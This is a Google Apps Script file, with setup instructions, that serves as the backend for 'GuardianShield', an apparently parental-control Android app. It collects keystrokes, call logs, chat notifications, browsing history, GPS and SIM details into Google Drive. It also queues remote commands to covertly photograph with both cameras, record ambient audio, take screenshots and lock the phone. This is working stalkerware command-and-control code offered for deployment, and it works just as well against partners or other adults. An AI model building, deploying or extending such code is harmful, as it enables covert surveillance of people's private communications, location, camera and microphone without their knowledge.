/**
 * GuardianShield - Advanced Google Apps Script Backend (24/7 Google Drive Storage Engine)
 * 
 * SETUP INSTRUCTIONS:
 * 1. Open https://script.google.com/
 * 2. Click "+ New project"
 * 3. Replace all code in Code.gs with this entire script
 * 4. Click "Deploy" > "New deployment"
 * 5. Select type: "Web app"
 * 6. Set "Execute as": "Me (<your email>)"
 * 7. Set "Who has access": "Anyone"
 * 8. Click "Deploy" and Copy the generated "Web App URL"
 * 9. Paste that URL into your Parent Dashboard and Android App Config!
 */

// Secret authentication token for security
var AUTH_TOKEN = "GUARDIAN_SECURE_TOKEN_98234";

// Main Google Drive Folder Name
var FOLDER_NAME = "GuardianShield_Data";

/**
 * Helper to get or create the main storage folder in Google Drive
 */
function getStorageFolder() {
  var folders = DriveApp.getFoldersByName(FOLDER_NAME);
  if (folders.hasNext()) {
    return folders.next();
  }
  return DriveApp.createFolder(FOLDER_NAME);
}

/**
 * Helper to get or create subfolders (photos, audio, screenshots)
 */
function getSubFolder(subName) {
  var parent = getStorageFolder();
  var sub = parent.getFoldersByName(subName);
  if (sub.hasNext()) {
    return sub.next();
  }
  return parent.createFolder(subName);
}

/**
 * Helper to get or create JSON storage file
 */
function getOrCreateFile(fileName, defaultContent) {
  var folder = getStorageFolder();
  var files = folder.getFilesByName(fileName);
  if (files.hasNext()) {
    return files.next();
  }
  return folder.createFile(fileName, defaultContent || "{}", MimeType.PLAIN_TEXT);
}

/**
 * Read JSON from Google Drive
 */
function readJson(fileName, defaultVal) {
  try {
    var file = getOrCreateFile(fileName, JSON.stringify(defaultVal || {}));
    var content = file.getBlob().getDataAsString();
    return JSON.parse(content);
  } catch (e) {
    return defaultVal || {};
  }
}

/**
 * Write JSON to Google Drive
 */
function writeJson(fileName, data) {
  var file = getOrCreateFile(fileName, "{}");
  file.setContent(JSON.stringify(data, null, 2));
}

/**
 * Handle HTTP GET - Parent Dashboard Queries
 */
function doGet(e) {
  try {
    var params = e.parameter || {};
    
    // Check security token
    if (params.token !== AUTH_TOKEN) {
      return responseJson({ status: "error", message: "Unauthorized access: Invalid token" });
    }

    var action = params.action || "all";

    // 1. Fetch Telemetry (GPS, Battery, Speed, Status)
    if (action === "telemetry") {
      var telemetry = readJson("telemetry.json", {
        battery: 92,
        charging: false,
        online: true,
        network: "Wi-Fi",
        wifiSsid: "Home_5G",
        latitude: 37.774929,
        longitude: -122.419418,
        speed: 0,
        address: "750 Market St, San Francisco, CA",
        lastSeen: new Date().toISOString(),
        currentApp: "com.whatsapp",
        currentAppName: "WhatsApp",
        isLocked: false,
        simSerial: "89014103211118510720",
        simOperator: "T-Mobile",
        deviceModel: "Samsung Galaxy S22"
      });
      return responseJson({ status: "success", data: telemetry });
    }

    // 2. Fetch Call Logs
    if (action === "calls") {
      var calls = readJson("call_logs.json", []);
      return responseJson({ status: "success", data: calls });
    }

    // 3. Fetch Social Media & Chat Notifications
    if (action === "social" || action === "notifications") {
      var social = readJson("social_notifications.json", []);
      return responseJson({ status: "success", data: social });
    }

    // 4. Fetch Apps and Screen Time
    if (action === "apps") {
      var apps = readJson("app_usage.json", {
        totalScreenTimeMinutes: 185,
        installedApps: [],
        blockedApps: []
      });
      return responseJson({ status: "success", data: apps });
    }

    // 5. Fetch Keystrokes & Keyword Safety Alerts
    if (action === "alerts" || action === "keystrokes") {
      var alerts = readJson("safety_alerts.json", []);
      return responseJson({ status: "success", data: alerts });
    }

    // 6. Fetch Visited URLs / Browsing History
    if (action === "browsing") {
      var browsing = readJson("browsing_history.json", []);
      return responseJson({ status: "success", data: browsing });
    }

    // 7. Fetch Pending Remote Commands (Checked by APK)
    if (action === "commands") {
      var commands = readJson("commands.json", {
        lockDevice: false,
        takePhotoFront: false,
        takePhotoRear: false,
        recordAudio: false,
        audioDurationSeconds: 15,
        takeScreenshot: false,
        playAlarm: false,
        blockedApps: [],
        bedtimeLock: false,
        lastUpdated: new Date().toISOString()
      });
      return responseJson({ status: "success", data: commands });
    }

    // 8. Fetch Captured Photos List
    if (action === "photos") {
      var photosFolder = getSubFolder("photos");
      var pFiles = photosFolder.getFiles();
      var photos = [];
      while (pFiles.hasNext()) {
        var pf = pFiles.next();
        photos.push({
          id: pf.getId(),
          name: pf.getName(),
          created: pf.getDateCreated().toISOString(),
          size: pf.getSize(),
          url: "https://drive.google.com/uc?export=view&id=" + pf.getId()
        });
      }
      return responseJson({ status: "success", data: photos });
    }

    // 9. Fetch Ambient Audio Recordings List
    if (action === "audio") {
      var audioFolder = getSubFolder("audio");
      var aFiles = audioFolder.getFiles();
      var audioClips = [];
      while (aFiles.hasNext()) {
        var af = aFiles.next();
        audioClips.push({
          id: af.getId(),
          name: af.getName(),
          created: af.getDateCreated().toISOString(),
          size: af.getSize(),
          url: "https://drive.google.com/uc?export=download&id=" + af.getId()
        });
      }
      return responseJson({ status: "success", data: audioClips });
    }

    // Default: Return All Aggregated Data in One Call
    var fullState = {
      telemetry: readJson("telemetry.json", {}),
      calls: readJson("call_logs.json", []),
      social: readJson("social_notifications.json", []),
      apps: readJson("app_usage.json", { installedApps: [], blockedApps: [] }),
      alerts: readJson("safety_alerts.json", []),
      browsing: readJson("browsing_history.json", []),
      commands: readJson("commands.json", {}),
      serverTime: new Date().toISOString()
    };

    return responseJson({ status: "success", data: fullState });

  } catch (err) {
    return responseJson({ status: "error", message: err.toString() });
  }
}

/**
 * Handle HTTP POST - Android APK Data Uploads & Parent Remote Commands
 */
function doPost(e) {
  try {
    var rawData = e.postData.contents;
    var body = JSON.parse(rawData);

    // Validate security token
    if (body.token !== AUTH_TOKEN) {
      return responseJson({ status: "error", message: "Unauthorized token" });
    }

    var action = body.action;

    // 1. Android Telemetry Sync (GPS, Battery, Speed, Current App)
    if (action === "update_telemetry") {
      var telemetry = body.data || {};
      telemetry.lastSeen = new Date().toISOString();
      writeJson("telemetry.json", telemetry);
      return responseJson({ status: "success", message: "Telemetry synced to Google Drive" });
    }

    // 2. Call Logs Sync
    if (action === "sync_calls") {
      var currentCalls = readJson("call_logs.json", []);
      var incoming = body.data || [];
      var mergedCalls = incoming.concat(currentCalls).slice(0, 300);
      writeJson("call_logs.json", mergedCalls);
      return responseJson({ status: "success", message: "Call logs saved" });
    }

    // 3. Social Media Notifications & Messages Sync
    if (action === "sync_social") {
      var currentNotifs = readJson("social_notifications.json", []);
      var incomingNotifs = body.data || [];
      var mergedNotifs = incomingNotifs.concat(currentNotifs).slice(0, 400);
      writeJson("social_notifications.json", mergedNotifs);
      return responseJson({ status: "success", message: "Social messages saved" });
    }

    // 4. App Usage & Blocklist Sync
    if (action === "sync_apps") {
      writeJson("app_usage.json", body.data);
      return responseJson({ status: "success", message: "App stats saved" });
    }

    // 5. Safety & Keyword Alerts Sync
    if (action === "sync_alerts") {
      var currentAlerts = readJson("safety_alerts.json", []);
      var newAlerts = body.data || [];
      var mergedAlerts = newAlerts.concat(currentAlerts).slice(0, 200);
      writeJson("safety_alerts.json", mergedAlerts);
      return responseJson({ status: "success", message: "Safety alerts logged" });
    }

    // 6. Visited Browsing URLs Sync
    if (action === "sync_browsing") {
      var currentUrls = readJson("browsing_history.json", []);
      var newUrls = body.data || [];
      var mergedUrls = newUrls.concat(currentUrls).slice(0, 300);
      writeJson("browsing_history.json", mergedUrls);
      return responseJson({ status: "success", message: "Browsing logs saved" });
    }

    // 7. Remote Camera Snapshot Upload (Base64 JPEG)
    if (action === "upload_photo") {
      var photosFolder = getSubFolder("photos");
      var base64Img = body.data.base64;
      var camType = body.data.camera || "front";
      var pName = "snap_" + camType + "_" + Utilities.formatDate(new Date(), "GMT", "yyyyMMdd_HHmmss") + ".jpg";
      var decoded = Utilities.base64Decode(base64Img);
      var blob = Utilities.newBlob(decoded, MimeType.JPEG, pName);
      var savedFile = photosFolder.createFile(blob);
      return responseJson({ status: "success", fileId: savedFile.getId(), name: pName });
    }

    // 8. Remote Ambient Audio Upload (Base64 M4A/MP3)
    if (action === "upload_audio") {
      var audioFolder = getSubFolder("audio");
      var base64Audio = body.data.base64;
      var aName = "audio_" + Utilities.formatDate(new Date(), "GMT", "yyyyMMdd_HHmmss") + ".m4a";
      var decodedAudio = Utilities.base64Decode(base64Audio);
      var audioBlob = Utilities.newBlob(decodedAudio, "audio/mp4", aName);
      var savedAudio = audioFolder.createFile(audioBlob);
      return responseJson({ status: "success", fileId: savedAudio.getId(), name: aName });
    }

    // 9. Remote Screenshot Upload (Base64 PNG)
    if (action === "upload_screenshot") {
      var screenFolder = getSubFolder("screenshots");
      var base64Screen = body.data.base64;
      var sName = "screen_" + Utilities.formatDate(new Date(), "GMT", "yyyyMMdd_HHmmss") + ".png";
      var decodedScreen = Utilities.base64Decode(base64Screen);
      var screenBlob = Utilities.newBlob(decodedScreen, MimeType.PNG, sName);
      var savedScreen = screenFolder.createFile(screenBlob);
      return responseJson({ status: "success", fileId: savedScreen.getId(), name: sName });
    }

    // 10. Parent Remote Commands Dispatch (Lock, Snap Camera, Record Mic, Alarm, Block App)
    if (action === "set_commands") {
      var currentCmds = readJson("commands.json", {});
      var updatedCmds = Object.assign({}, currentCmds, body.data, { lastUpdated: new Date().toISOString() });
      writeJson("commands.json", updatedCmds);
      return responseJson({ status: "success", message: "Command dispatched to Google Drive", commands: updatedCmds });
    }

    // 11. APK Command Acknowledgment / Reset
    if (action === "ack_command") {
      var cmds = readJson("commands.json", {});
      if (body.commandName && cmds.hasOwnProperty(body.commandName)) {
        cmds[body.commandName] = false;
        writeJson("commands.json", cmds);
      }
      return responseJson({ status: "success", message: "Command reset" });
    }

    return responseJson({ status: "error", message: "Unknown action parameter" });

  } catch (err) {
    return responseJson({ status: "error", message: err.toString() });
  }
}

/**
 * Output formatted JSON with CORS headers
 */
function responseJson(data) {
  return ContentService.createTextOutput(JSON.stringify(data))
    .setMimeType(ContentService.MimeType.JSON);
}
